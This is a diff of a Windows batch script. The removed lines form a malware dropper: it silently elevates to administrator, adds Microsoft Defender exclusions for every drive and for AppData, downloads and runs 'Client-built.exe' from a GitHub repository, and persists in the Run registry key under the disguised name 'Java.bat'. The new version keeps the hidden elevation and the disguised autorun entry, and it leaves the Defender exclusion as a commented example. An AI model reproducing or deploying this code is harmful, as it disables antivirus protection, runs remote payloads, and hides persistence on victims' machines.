@@ -1,36 +1,32 @@
 @echo off
-:: Force admin
+:: Elevate if not admin
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
 
-:: === VARIABLES ===
-set "APPDATA_PATH=%USERPROFILE%\AppData"
-set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
-set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
-set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-set "REG_NAME=Java.bat"
+:: === Variables ===
 set "SELF_PATH=%~f0"
+set "REG_RUN=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+set "REG_APPROVED=HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"
+set "REG_NAME=Java.bat"
 
-:: ✅ REMOVE OLD ENTRY for i.bat or anything else
-reg delete "%REG_PATH%" /v "i.bat" /f >nul 2>&1
-reg delete "%REG_PATH%" /v "JavaStartup" /f >nul 2>&1
+:: ✅ Delete i.bat from both registry locations
+reg delete "%REG_RUN%" /v "i.bat" /f >nul 2>&1
+reg delete "%REG_APPROVED%" /v "i.bat" /f >nul 2>&1
 
-:: ✅ ADD to registry under the name Java.bat
-reg add "%REG_PATH%" /v "%REG_NAME%" /d "\"%SELF_PATH%\"" /f
+:: Optional: delete other stale entries
+reg delete "%REG_RUN%" /v "JavaStartup" /f >nul 2>&1
+reg delete "%REG_APPROVED%" /v "JavaStartup" /f >nul 2>&1
 
-:: Defender exclusions
-for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
-    if exist %%L:\ (
-        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%L:\'"
-    )
-)
-powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
+:: ✅ Add THIS script to run as "Java.bat"
+reg add "%REG_RUN%" /v "%REG_NAME%" /d "\"%SELF_PATH%\"" /f
 
-:: Download and run payload
-powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
-start "" "%TARGET_FILE%"
+:: Exclude example (optional)
+:: powershell -Command "Add-MpPreference -ExclusionPath '%~dp0'"
 
+:: Confirm to user
+echo [✓] Java.bat registered. Reboot to see Task Manager update.
+pause
 exit
